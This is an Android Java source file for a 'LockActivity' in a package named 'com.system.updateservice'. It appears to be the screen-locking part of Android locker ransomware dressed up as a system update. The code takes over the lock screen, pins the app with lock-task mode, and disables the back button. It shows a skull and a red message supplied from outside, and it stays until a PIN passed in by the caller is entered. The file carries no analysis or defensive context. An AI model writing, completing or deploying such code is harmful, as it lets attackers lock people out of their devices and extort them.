package com.system.updateservice;
import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.*;
public class LockActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) { setShowWhenLocked(true); setTurnScreenOn(true); }
        else { getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON); }
        startLockTask();
        String msg = getIntent().getStringExtra("msg"); String pin = getIntent().getStringExtra("pin");
        LinearLayout layout = new LinearLayout(this); layout.setOrientation(LinearLayout.VERTICAL); layout.setBackgroundColor(0xFF000000); layout.setGravity(Gravity.CENTER); layout.setPadding(50,50,50,50);
        TextView tv = new TextView(this); tv.setText("💀\n\n" + msg); tv.setTextColor(0xFFFF0000); tv.setTextSize(24); tv.setGravity(Gravity.CENTER); layout.addView(tv);
        EditText et = new EditText(this); et.setHint("ENTER PIN"); et.setInputType(android.text.InputType.TYPE_CLASS_NUMBER); et.setTextColor(0xFFFFFFFF); et.setGravity(Gravity.CENTER); layout.addView(et);
        Button btn = new Button(this); btn.setText("UNLOCK"); btn.setOnClickListener(v -> { if(et.getText().toString().equals(pin)) { stopLockTask(); finish(); } else Toast.makeText(this,"PIN SALAH",Toast.LENGTH_SHORT).show(); }); layout.addView(btn);
        setContentView(layout);
    }
    @Override public void onBackPressed() { }
}
